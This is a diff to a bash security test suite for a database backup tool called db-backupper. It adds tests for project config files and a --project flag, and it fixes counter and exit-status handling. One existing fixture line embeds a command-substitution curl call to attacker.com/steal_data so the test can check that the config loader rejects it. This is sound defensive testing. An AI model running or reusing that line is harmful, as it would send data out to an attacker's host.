@@ -31,12 +31,12 @@ test_info() {
 
 test_pass() {
     echo "✅ PASS: $1" | tee -a "$TEST_LOG"
-    ((TESTS_PASSED++))
+    TESTS_PASSED=$((TESTS_PASSED + 1))
 }
 
 test_fail() {
     echo "❌ FAIL: $1" | tee -a "$TEST_LOG"
-    ((TESTS_FAILED++))
+    TESTS_FAILED=$((TESTS_FAILED + 1))
 }
 
 # Test 1: SQL Injection Prevention
@@ -132,7 +132,7 @@ MALICIOUS_VAR=$(curl http://attacker.com/steal_data)
 EOF
     
     # Test that malicious config is rejected
-    if load_config_secure "$malicious_config" 2>/dev/null; then
+    if (load_config_secure "$malicious_config" 2>/dev/null); then
         test_fail "Malicious config was executed"
     else
         test_pass "Malicious config was rejected"
@@ -150,7 +150,7 @@ S3_BACKUP_PATH="backups/"
 EOF
     
     # Test that valid config is accepted
-    if load_config_secure "$valid_config" 2>/dev/null; then
+    if (load_config_secure "$valid_config" 2>/dev/null); then
         test_pass "Valid config was accepted"
     else
         test_fail "Valid config was rejected"
@@ -177,9 +177,12 @@ test_path_traversal() {
     
     for prefix in "${malicious_prefixes[@]}"; do
         local result
-        result=$(sanitize_s3_prefix "$prefix" 2>/dev/null)
-        if [[ $? -eq 0 && "$result" == *".."* ]] || [[ "$result" == "/"* ]]; then
-            test_fail "Path traversal test: $prefix produced unsafe result: $result"
+        if result=$(sanitize_s3_prefix "$prefix" 2>/dev/null); then
+            if [[ "$result" == *".."* ]] || [[ "$result" == "/"* ]]; then
+                test_fail "Path traversal test: $prefix produced unsafe result: $result"
+            else
+                test_pass "Path traversal test: $prefix was sanitized safely"
+            fi
         else
             test_pass "Path traversal test: $prefix was sanitized or rejected"
         fi
@@ -195,8 +198,7 @@ test_path_traversal() {
     
     for prefix in "${valid_prefixes[@]}"; do
         local result
-        result=$(sanitize_s3_prefix "$prefix" 2>/dev/null)
-        if [[ $? -eq 0 && -n "$result" ]]; then
+        if result=$(sanitize_s3_prefix "$prefix" 2>/dev/null) && [[ -n "$result" ]]; then
             test_pass "Valid prefix test: $prefix was accepted as $result"
         else
             test_fail "Valid prefix test: $prefix was rejected"
@@ -276,6 +278,217 @@ test_resource_limits() {
     fi
 }
 
+create_stub_command() {
+    local bin_dir="$1"
+    local command_name="$2"
+
+    cat > "${bin_dir}/${command_name}" << 'EOF'
+#!/usr/bin/env bash
+exit 0
+EOF
+    chmod +x "${bin_dir}/${command_name}"
+}
+
+# Test 7: Project config validation
+test_project_config_support() {
+    test_info "Testing project configuration support..."
+
+    local temp_root
+    temp_root=$(mktemp -d)
+    local temp_home="${temp_root}/home"
+    local previous_home="$HOME"
+
+    mkdir -p "${temp_home}/.config/db-backupper/projects"
+
+    cat > "${temp_home}/.config/db-backupper/projects/app-prod.conf" << 'EOF'
+AWS_PROFILE="prod"
+S3_BUCKET_NAME="bucket"
+S3_BACKUP_PATH="postgres/app-prod/"
+POSTGRES_URI="postgresql://user:password@localhost:5432/app_prod"
+DOCKER_CONTAINER_NAME="postgres-app-prod"
+EOF
+
+    HOME="$temp_home"
+
+    if validate_project_name "app-prod_01"; then
+        test_pass "Project name validation accepts valid names"
+    else
+        test_fail "Project name validation rejected a valid name"
+    fi
+
+    if validate_project_name "app/prod" >/dev/null 2>&1; then
+        test_fail "Project name validation accepted an invalid name"
+    else
+        test_pass "Project name validation rejects invalid names"
+    fi
+
+    if load_project_config "app-prod" >/dev/null 2>&1; then
+        test_pass "Project config loading accepted a valid project config"
+    else
+        test_fail "Project config loading rejected a valid project config"
+    fi
+
+    if [[ "${AWS_PROFILE:-}" == "prod" && "${S3_BUCKET_NAME:-}" == "bucket" ]]; then
+        test_pass "Project config loading populated runtime variables"
+    else
+        test_fail "Project config loading did not populate runtime variables"
+    fi
+
+    if (load_project_config "missing-project" >/dev/null 2>&1); then
+        test_fail "Missing project config was accepted"
+    else
+        test_pass "Missing project config was rejected"
+    fi
+
+    HOME="$previous_home"
+    rm -rf "$temp_root"
+}
+
+# Test 8: CLI project flag compatibility
+test_cli_project_flag() {
+    test_info "Testing CLI project flag compatibility..."
+
+    local temp_root
+    temp_root=$(mktemp -d)
+    local temp_home="${temp_root}/home"
+    local fake_bin="${temp_root}/bin"
+    local cli_path="${SCRIPT_DIR}/../db-backupper"
+    local legacy_output=""
+    local project_output=""
+
+    mkdir -p "${temp_home}/.config/db-backupper/projects" "${fake_bin}"
+
+    cat > "${temp_home}/.config/db-backupper/backup.conf" << 'EOF'
+AWS_PROFILE="legacy"
+S3_BUCKET_NAME="legacy-bucket"
+S3_BACKUP_PATH="legacy/"
+POSTGRES_URI="postgresql://user:password@localhost:5432/legacydb"
+DOCKER_CONTAINER_NAME="legacy-postgres"
+EOF
+
+    cat > "${temp_home}/.config/db-backupper/projects/app-prod.conf" << 'EOF'
+AWS_PROFILE="project"
+S3_BUCKET_NAME="project-bucket"
+S3_BACKUP_PATH="project/"
+POSTGRES_URI="postgresql://user:password@localhost:5432/projectdb"
+DOCKER_CONTAINER_NAME="project-postgres"
+EOF
+
+    create_stub_command "$fake_bin" "aws"
+    create_stub_command "$fake_bin" "docker"
+    create_stub_command "$fake_bin" "tar"
+    create_stub_command "$fake_bin" "find"
+    create_stub_command "$fake_bin" "sed"
+    create_stub_command "$fake_bin" "tr"
+
+    if legacy_output=$(HOME="$temp_home" PATH="$fake_bin:$PATH" "$cli_path" crontab 2>/dev/null); then
+        test_pass "CLI still works in legacy mode without --project"
+    else
+        test_fail "CLI failed in legacy mode without --project"
+    fi
+
+    if [[ "$legacy_output" == *"Active mode: legacy backup.conf"* ]] && [[ "$legacy_output" != *"--project"* ]]; then
+        test_pass "Legacy crontab output stays in legacy mode"
+    else
+        test_fail "Legacy crontab output included unexpected project mode details"
+    fi
+
+    if project_output=$(HOME="$temp_home" PATH="$fake_bin:$PATH" "$cli_path" --project app-prod crontab 2>/dev/null); then
+        test_pass "CLI accepts --project before the action"
+    else
+        test_fail "CLI rejected --project before the action"
+    fi
+
+    if HOME="$temp_home" PATH="$fake_bin:$PATH" "$cli_path" crontab --project app-prod >/dev/null 2>&1; then
+        test_pass "CLI accepts --project after the action"
+    else
+        test_fail "CLI rejected --project after the action"
+    fi
+
+    if HOME="$temp_home" PATH="$fake_bin:$PATH" "$cli_path" --project missing-project crontab >/dev/null 2>&1; then
+        test_fail "CLI accepted a missing project config"
+    else
+        test_pass "CLI rejects a missing project config"
+    fi
+
+    if [[ "$project_output" == *"Active project: app-prod"* ]] && [[ "$project_output" == *"--project \"app-prod\" backup"* ]]; then
+        test_pass "Project crontab output includes the active project flag"
+    else
+        test_fail "Project crontab output is missing the active project flag"
+    fi
+
+    rm -rf "$temp_root"
+}
+
+# Test 9: Project listing works without active config
+test_list_projects() {
+    test_info "Testing project listing command..."
+
+    local temp_root
+    temp_root=$(mktemp -d)
+    local temp_home="${temp_root}/home"
+    local temp_workdir="${temp_root}/workdir"
+    local cli_path="${SCRIPT_DIR}/../db-backupper"
+    local output=""
+
+    mkdir -p "${temp_home}/.config/db-backupper/projects"
+    mkdir -p "${temp_workdir}/.db-backupper/projects"
+
+    cat > "${temp_home}/.config/db-backupper/projects/home-app.conf" << 'EOF'
+AWS_PROFILE="home"
+S3_BUCKET_NAME="bucket"
+POSTGRES_URI="postgresql://user:password@localhost:5432/home_app"
+DOCKER_CONTAINER_NAME="home-postgres"
+EOF
+
+    cat > "${temp_home}/.config/db-backupper/projects/shared.conf" << 'EOF'
+AWS_PROFILE="home"
+S3_BUCKET_NAME="bucket"
+POSTGRES_URI="postgresql://user:password@localhost:5432/home_shared"
+DOCKER_CONTAINER_NAME="home-shared-postgres"
+EOF
+
+    cat > "${temp_workdir}/.db-backupper/projects/local-app.conf" << 'EOF'
+AWS_PROFILE="local"
+S3_BUCKET_NAME="bucket"
+POSTGRES_URI="postgresql://user:password@localhost:5432/local_app"
+DOCKER_CONTAINER_NAME="local-postgres"
+EOF
+
+    cat > "${temp_workdir}/.db-backupper/projects/shared.conf" << 'EOF'
+AWS_PROFILE="local"
+S3_BUCKET_NAME="bucket"
+POSTGRES_URI="postgresql://user:password@localhost:5432/local_shared"
+DOCKER_CONTAINER_NAME="local-shared-postgres"
+EOF
+
+    if output=$(cd "$temp_workdir" && HOME="$temp_home" "$cli_path" list-projects 2>/dev/null); then
+        test_pass "list-projects runs without legacy config or command dependencies"
+    else
+        test_fail "list-projects failed without legacy config or command dependencies"
+    fi
+
+    if [[ "$output" == *"1. local-app -> ./.db-backupper/projects/local-app.conf"* ]] && [[ "$output" == *"2. shared -> ./.db-backupper/projects/shared.conf"* ]] && [[ "$output" == *"3. home-app -> ${temp_home}/.config/db-backupper/projects/home-app.conf"* ]]; then
+        test_pass "list-projects reports discovered projects in precedence order"
+    else
+        test_fail "list-projects did not report expected projects and precedence"
+    fi
+
+    if [[ "$output" != *"${temp_home}/.config/db-backupper/projects/shared.conf"* ]]; then
+        test_pass "list-projects deduplicates lower-precedence project names"
+    else
+        test_fail "list-projects showed duplicate project names from lower-precedence configs"
+    fi
+
+    if HOME="$temp_home" "$cli_path" --project app-prod list-projects >/dev/null 2>&1; then
+        test_fail "list-projects accepted --project unexpectedly"
+    else
+        test_pass "list-projects rejects --project as invalid"
+    fi
+
+    rm -rf "$temp_root"
+}
+
 # Main test runner
 main() {
     test_info "Starting security test suite for db-backupper"
@@ -288,6 +501,9 @@ main() {
     test_path_traversal
     test_archive_security
     test_resource_limits
+    test_project_config_support
+    test_cli_project_flag
+    test_list_projects
     
     # Report results
     echo
